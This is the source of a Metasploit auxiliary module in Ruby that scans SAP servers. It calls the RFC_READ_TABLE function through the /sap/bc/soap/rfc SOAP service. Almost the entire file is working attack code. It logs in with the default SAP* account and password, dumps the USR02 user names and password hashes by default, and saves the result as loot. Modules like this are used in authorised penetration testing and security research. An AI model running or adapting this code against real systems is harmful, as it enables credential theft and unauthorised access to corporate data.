##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data',
      'Description' => %q{
        This module makes use of the RFC_READ_TABLE Function to read data from tables using
        the /sap/bc/soap/rfc SOAP service.
      },
      'References' =>
        [
          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
        ],
      'Author' =>
        [
          'Agnivesh Sathasivam',
          'nmonkee'
        ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('CLIENT', [true, 'SAP client', '001']),
        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
        OptString.new('HttpPassword', [true, 'Password', '06071992']),
        OptString.new('TABLE', [true, 'Table to read', 'USR02']),
        OptString.new('FIELDS', [true, 'Fields to read', 'BNAME,BCODE'])
      ])
  end

  def run_host(ip)
    columns = []
    columns << '*' if datastore['FIELDS'].nil? or datastore['FIELDS'].empty?
    if datastore['FIELDS']
      columns.push(datastore['FIELDS']) if datastore['FIELDS'] =~ /^\w?/
      columns = datastore['FIELDS'].split(',') if datastore['FIELDS'] =~ /\w*,\w*/
    end
    fields = ''
    columns.each do |d|
      fields << "<item><FIELDNAME>" + d.gsub(/\s+/, "") + "</FIELDNAME></item>"
    end
    exec(ip,fields)
  end

  def exec(ip,fields)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    data << '<env:Body>'
    data << '<n1:RFC_READ_TABLE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<DELIMITER xsi:type="xsd:string">|</DELIMITER>'
    data << '<NO_DATA xsi:nil="true"></NO_DATA>'
    data << '<QUERY_TABLE xsi:type="xsd:string">' + datastore['TABLE'] + '</QUERY_TABLE>'
    data << '<DATA xsi:nil="true"></DATA>'
    data << '<FIELDS xsi:nil="true">' + fields + '</FIELDS>'
    data << '<OPTIONS xsi:nil="true"></OPTIONS>'
    data << '</n1:RFC_READ_TABLE>'
    data << '</env:Body>'
    data << '</env:Envelope>'
    print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_READ_TABLE request")
    begin
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
        'ctype' => 'text/xml; charset=UTF-8',
        'encode_params' => false,
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        },
        'vars_get' => {
          'sap-client'    => datastore['CLIENT'],
          'sap-language'  => 'EN'
        }
      })
      if res and res.code != 500 and res.code != 200
        # to do - implement error handlers for each status code, 404, 301, etc.
        if res.body =~ /<h1>Logon failed<\/h1>/
          print_error("[SAP] #{ip}:#{rport} - login failed!")
        else
          print_error("[SAP] #{ip}:#{rport} - something went wrong!")
        end
        return
      elsif res and res.body =~ /Exception/
        response = res.body
        error = response.scan(%r{<faultstring>(.*?)</faultstring>})
        0.upto(error.length-1) do |i|
          print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
        end
        return
      elsif res
        response = res.body
        output = response.scan(%r{<WA>([^<]+)</WA>}).flatten
        print_status("[SAP] #{ip}:#{rport} - got response")
        saptbl = Msf::Ui::Console::Table.new(
          Msf::Ui::Console::Table::Style::Default,
          'Header' => "[SAP] RFC_READ_TABLE",
          'Prefix' => "\n",
          'Postfix' => "\n",
          'Indent' => 1,
          'Columns' => ["Returned Data"]
        )
        0.upto(output.length-1) do |i|
          saptbl << [output[i]]
        end
        print(saptbl.to_s)
        this_service = report_service(
          :host  => ip,
          :port => rport,
          :name => 'sap',
          :proto => 'tcp'
        )
        loot_path = store_loot("sap.tables.data", "text/plain", ip, saptbl.to_s, "#{ip}_sap_#{datastore['TABLE'].downcase}.txt", "SAP Data", this_service)
        print_good("[SAP] #{ip}:#{rport} - Data stored in #{loot_path}")
        return
      else
        print_error("[SAP] #{ip}:#{rport} - Unknown error")
        return
      end
    rescue ::Rex::ConnectionError
      print_error("[SAP] #{ip}:#{rport} - Unable to connect")
    end
  end
end
